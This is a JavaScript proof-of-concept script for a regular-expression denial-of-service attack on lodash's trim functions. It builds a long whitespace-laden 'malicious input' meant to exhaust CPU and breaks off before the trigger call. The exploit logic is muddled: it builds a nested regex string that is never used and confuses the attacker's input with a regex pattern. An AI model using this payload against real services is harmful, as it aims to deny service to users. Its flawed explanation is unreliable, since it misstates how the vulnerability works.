  const _ = require('lodash');

  // The vulnerability resides in the regex /[\s]+$/ used internally by _.trimRight (and thus _.trim and _.toNumber).
  // Vulnerable versions of lodash rely on this regex to strip trailing whitespace.
  // Inputs that construct a pattern like '(A+)*$' where 'A' matches the whitespace class can trigger exponential backtracking.
  // We construct a payload that exploits this ambiguity to exceed the backtracking limit (e.g., > 30,000) 
  // and consume excessive CPU time or cause timeouts.

  console.log('[*] Constructing malicious input...');

  // We build the ReDoS structure: '( +\t\n\r)+$' nested to increase depth/ambiguity.
  // The characters ' ', '\t', '\n', '\r' are all part of \s.
  // Concatenating high-ambiguity groups forces the regex engine into exponential state expansion.

  const reDoSPart1 = ' ';   // Matches space (part of \s)
  const reDoSPart2 = '\t\n\r\u00a0'; // Matches tab, newline, return & NBSP (all part of \s)

  // Create a nested repetition pattern (A+)*$ structure typical of ReDoS triggers.
  // Depth ~25 creates sufficient complexity to trigger backtracking limits in vulnerable engines.
  let badRegexString = '$';
  const basePattern = '(' + reDoSPart1 + '+' + '|' + '(' + reDoSPart2 + '+)?)';

  for (let i = 0; i < 30; i++) {
    // Builds a structure equivalent to ((...)+)+$ which expands state space exponentially
    badRegexString = '(' + basePattern + ')' + badRegexString; 
  }

  // Pad with actual non-matching character at the end to trigger backtracking when the '$' is reached or failed
  const maliciousInput = '( +\t\n\r\u00a0)'.repeat(15000) + 'a'; 

  console.log(`[*] Input length: ${maliciousInput.length}`);

  console.log('[*] Triggering ReDoS via _.trim...');

